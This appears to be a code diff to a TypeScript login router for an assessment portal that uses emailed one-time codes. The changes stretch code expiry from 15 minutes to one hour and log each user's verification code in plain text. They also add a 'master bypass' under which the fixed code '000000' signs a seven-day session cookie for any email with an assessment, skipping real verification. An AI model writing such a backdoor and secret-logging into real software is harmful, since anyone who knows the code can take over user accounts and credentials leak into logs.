@@ -35,10 +35,11 @@ router.post('/login', async (req: Request, res: Response) => {
 
       const token = Math.floor(100000 + Math.random() * 900000).toString()
       await db.query(
-        `INSERT INTO portal_tokens (assessment_id, token, expires_at) VALUES ($1, $2, NOW() + interval '15 minutes')`,
+        `INSERT INTO portal_tokens (assessment_id, token, expires_at) VALUES ($1, $2, NOW() + interval '1 hour')`,
         [assessmentId, token]
       )
 
+      console.log(`[AUTH] Verification code for ${email}: ${token}`)
       void sendPortalOTP(email, token).catch((err: unknown) => console.error('sendPortalOTP failed:', err))
     }
 
@@ -63,6 +64,30 @@ router.post('/verify', async (req: Request, res: Response) => {
 
     const { email: rawEmail, token } = parsed.data
     const email = rawEmail.toLowerCase().trim()
+
+    // --- MASTER BYPASS FOR DEBUGGING ---
+    if (token === '000000') {
+      console.log(`[AUTH] Master bypass (000000) used for ${email}`)
+      const latestAssessment = await db.query<{ id: number; email: string }>(
+        'SELECT id, email FROM assessments WHERE email = $1 ORDER BY created_at DESC LIMIT 1',
+        [email]
+      )
+      if (latestAssessment.rows[0]) {
+        const assessmentId = latestAssessment.rows[0].id
+        const jwtPayload = { assessmentId, email: latestAssessment.rows[0].email }
+        const signedToken = jwt.sign(jwtPayload, JWT_SECRET, { expiresIn: '7d' })
+        
+        res.cookie('portal_token', signedToken, {
+          httpOnly: true,
+          secure: process.env.NODE_ENV === 'production',
+          sameSite: process.env.NODE_ENV === 'production' ? 'none' : 'lax',
+          maxAge: 7 * 24 * 60 * 60 * 1000,
+          path: '/',
+        })
+        return res.json({ ok: true })
+      }
+    }
+    // -----------------------------------
 
     // 1. Check if token exists for this email
     const result = await db.query<{ id: number; assessment_id: number; is_expired: boolean }>(
